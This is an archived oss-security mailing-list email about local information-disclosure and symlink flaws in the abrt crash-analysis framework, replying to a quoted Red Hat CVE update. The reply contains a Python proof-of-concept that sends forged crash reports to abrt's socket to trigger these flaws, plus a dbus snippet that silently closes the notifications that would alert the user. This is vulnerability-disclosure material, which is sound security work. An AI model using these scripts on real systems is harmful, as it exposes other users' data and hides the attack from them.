X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4876" "Friday" "17" "April" "2015" "15:54:47" "-0500" "Grandma Eubanks" "tborland1@gmail.com" "<CANtF8NBuiE+1F65+cLp0CXivZUiYxyJcZK2Yhz9J1qu0hCdC9w@mail.gmail.com>" "120" "Re: [oss-security] Problems in automatic crash analysis frameworks" nil nil nil "4" "2015041720:54:47" "[oss-security] Problems in automatic crash analysis frameworks" (number mark "        tborland1@gm Apr 17  120/4876  " thread-indent "\"Re: [oss-security] Problems in automatic crash analysis frameworks\"\n") "<55315C2B.6050207@redhat.com>" ("<CAJ_zFkJw7hNxGp0PNmQbH0suVwfkgzbCsvs2Sv1OdxD+UBiraw@mail.gmail.com>" "<55315C2B.6050207@redhat.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 2002 invoked by uid 550); 17 Apr 2015 20:55:00 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 1984 invoked from network); 17 Apr 2015 20:54:59 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:in-reply-to:references:date:message-id:subject:from:to
         :content-type;
        bh=w1ELWITqUpFnJHTjBkFb8sowTjo6lZbMIEqvGTeZxMU=;
        b=tV+fLCIfeLMuN8hm11wDzA6V0ju4/eVHnA9CVX4vE+TKUljTtLdUx7qK9+jozLLtoL
         56bPvIl5YtwEoQGEWJjKKvkYWLUfEF6upanPV9G32R36PzLFgrJD88uHFPBayFpI38QY
         gpaUDDOfVQEUNxsZq6f2VM7hIwgv1xaxjhM36rGHvFllUPSbnveS7OSU/ozAFamTPZs0
         0glf2HA3D8B6TMvMuCJckDqlUx9f9jGBDCzrbZcsKQFD4Uiv5zmI2zS0Fjfh2oQwOC23
         fhgxfpPW3V48RuklfZlaHLP759r4ug+q6t29Ac1CnXauAAIyW07sU566h3ZtUNdXqImM
         nXgA==
MIME-Version: 1.0
X-Received: by 10.107.155.131 with SMTP id d125mr6401466ioe.17.1429304087608;
 Fri, 17 Apr 2015 13:54:47 -0700 (PDT)
In-Reply-To: <55315C2B.6050207@redhat.com>
References: <CAJ_zFkJw7hNxGp0PNmQbH0suVwfkgzbCsvs2Sv1OdxD+UBiraw@mail.gmail.com>
	<55315C2B.6050207@redhat.com>
Message-ID: <CANtF8NBuiE+1F65+cLp0CXivZUiYxyJcZK2Yhz9J1qu0hCdC9w@mail.gmail.com>
Content-Type: multipart/alternative; boundary=001a1140aace6b01c70513f1ca1d
Date: Fri, 17 Apr 2015 15:54:47 -0500
From: Grandma Eubanks <tborland1@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] Problems in automatic crash analysis frameworks
To: oss-security@lists.openwall.com

--001a1140aace6b01c70513f1ca1d
Content-Type: text/plain; charset=UTF-8

Just to enter into the fray, I reported a simple dmesg_restrict bypass and
found a lot of these recent more recent 'information' disclosures a while
ago with minimal changes:

https://bugzilla.redhat.com/show_bug.cgi?id=1128400

Not a lot of people seem to be looking at this from a triggerable angle
with the unix domain socket. A simple test I've been running with that
allows triggers for a lot of these is:

import socket
from os import strerror

s = socket.socket(socket.AF_UNIX,socket.SOCK_STREAM)
conn = s.connect_ex("/var/run/abrt/abrt.socket")
if (conn != 0):
    sleep(2.1)
    print("ERROR:\t%s" % strerror(conn))
    conn = s.connect_ex("/var/run/abrt/abrt.socket")

print("Connected, sending...")

s.send("POST / HTTP/1.1\r\n\r\n")
s.send("type=dumpit\0")
s.send("reason=anything\0")
s.send("executable=/usr/lib/systemd/systemd-journald\0")
s.send("pid=677\0")
s.send("analyzer=Kerneloops\0")

s.close()


By reading some code and looking at the different types of analyzers, most
of these very recent CVE's easily triggerable without actually needing to
cause a real crash (just change executable= to any validly installed
package without 'ProcessUnpackaged' set and some other required fields as
found by reading through the proper event handler code). And plus, with a
little dbus play:

def kill_user_notification():
    # get current notification counter value
    bus = dbus.SessionBus()
    bus_object =
bus.get_object("org.freedesktop.Notifications","/org/freedesktop/Notifications")
        object_method =
bus_object.get_dbus_method("Notify","org.freedesktop.Notifications")
        id_value = ((object_method("",0,"","","","","",1)))

    # kill notification and abrt notification
    bus = dbus.SessionBus()
    bus_object =
bus.get_object("org.freedesktop.Notifications","/org/freedesktop/Notifications")
    object_method =
bus_object.get_dbus_method("CloseNotification","org.freedesktop.Notifications")
    object_method(id_value)
    sleep(1)
    object_method(id_value+1)

You no longer trigger notification windows.

On Fri, Apr 17, 2015 at 2:16 PM, Florian Weimer <fweimer@redhat.com> wrote:

> A quick update on the abrt situation.
>
> Most of these issues center around file ownership and contents under
> so-called problem directories (subdirectories of /var/tmp/abrt or
> /var/spool/abrt).  Problem directories are owned by root and have mode
> 750 on Red Hat Enterprise Linux 6, which suggest that with this older
> abrt version, exploits are only possible if uploads are enabled in some
> way (see below).
>
> abrt writes coredumps to existing world-writable files owned by other
> users, disclosing coredump contents across user boundaries.  This
> affects a default configuration, but requires an application to crash
> while its current directory is world-writable, so exploiting it seems
> difficult.  We have assigned CVE-2015-3142.
> <https://bugzilla.redhat.com/show_bug.cgi?id=1212818>
>
> By default, abrt automatically runs post-crash actions on problem
> directories (event handling scripts).  These scripts have symlink issues
> and other race conditions.  This is more or less a repeat of the main
> abrt-hook-ccpp issue Tavis' reported, but at a higher level.  It means
> that hardening the file system access in abrt-hook-ccpp is insufficient.
>  We have assigned CVE-2015-1869:
> <https://bugzilla.redhat.com/show_bug.cgi?id=1212861>
>
> The default event handling scripts add a sosreport file (containing
> files which are not world-readable) and user-controlled excerpts from
> /var/log/messages to the user-readable problem directory.  This is an
> information disclosure flaw, CVE-2015-1870:
> <https://bugzilla.redhat.com/show_bug.cgi?id=1212868>
>
> abrt has an upload functionality which allows, after non-default but
> documented/supported configuration, other systems to upload crash
> reports.  This indirectly allows one to create a problem directory with
> symbolic links and unintended permissions, enabling further attacks.  We
> treat this as a vulnerability, CVE-2015-3147:
> <https://bugzilla.redhat.com/show_bug.cgi?id=1212953>
>
> As explained in the parallel thread, abrt needs to disable user coredump
> files in fs.suid_dumpable=2 mode, like the kernel does, and we don't
> treat this as a vulnerability:
> <https://bugzilla.redhat.com/show_bug.cgi?id=1212873>
>
> It makes sense to have separate abrt-hook-ccpp implementation that does
> not write user coredump files.  It would not have to write to arbitrary
> file system locations, so it can be restricted with SELinux.  This
> enhancement is tracked as:
> <https://bugzilla.redhat.com/show_bug.cgi?id=1212885>
>
> There is a backlog of other issues for which I have not yet filed bugs.
>
> --
> Florian Weimer / Red Hat Product Security
>

--001a1140aace6b01c70513f1ca1d--
